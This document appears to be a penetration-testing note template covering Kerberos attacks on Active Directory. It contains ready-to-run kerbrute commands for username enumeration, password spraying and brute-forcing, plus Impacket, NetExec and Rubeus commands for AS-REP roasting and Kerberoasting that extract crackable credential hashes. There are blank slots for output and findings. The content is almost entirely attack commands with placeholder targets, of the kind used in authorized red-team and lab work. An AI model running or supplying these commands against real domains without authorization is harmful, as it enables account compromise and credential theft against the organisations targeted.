Template Version: 2025.09.05
### KerBrute:
###### Username enumeration:
- `kerbrute userenum -d <DN> --dc <IP> -t 100 <wordlist>`
###### Password spray:
- `kerbrute passwordspray --dc <IP> -d <DN> users.txt '<password>'`
###### User brute-force:
- `kerbrute bruteuser -d <DN> --dc <IP> <wordlist> '<user>'`
###### Wordlists:
- `/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt`
###### Terminal Output:

###### Findings:

---
### AS-REP Roast (No Creds Required):
###### Commands:
- **Impacket LDAP bind:** `impacket-GetNPUsers -request -format john -outputfile roastables.txt -dc-ip <IP> '<domain>/<user>:<pass>'` (remove user/pass for anon bind) (use `-hashes 'LM:NT'` for NT hash, remove password)
- **Impacket File:** `impacket-GetNPUsers -usersfile users.txt -request -format john -outputfile roastables.txt -dc-ip <IP> '<domain>/'`
- **NetExec:** `netexec ldap <DC> -u <user> -p <pass> --asreproast [<file> | /dev/null]`
- Rubeus: `.\rubeus.exe asreproast /nowrap`

---
### Kerberoasting (Requires Domain Creds):
###### Commands:
- Impacket password: `impacket-GetUserSPNs -outputfile hashes.txt -dc-ip <IP> '<domain.tld>/<user>:<pass>'`
- Impacket hash: `impacket-GetUserSPNs -outputfile hashes.txt -hashes '<LM>:<NT>' -dc-ip <IP> '<domain.tld>/<user>'`
- NetExec: `netexec ldap <domain.tld> -u '<user>' -p '<pass>' --kerberoasting users.txt --kdcHost <IP>`
- Rubeus: `.\rubeus.exe kerberoast /nowrap`

---
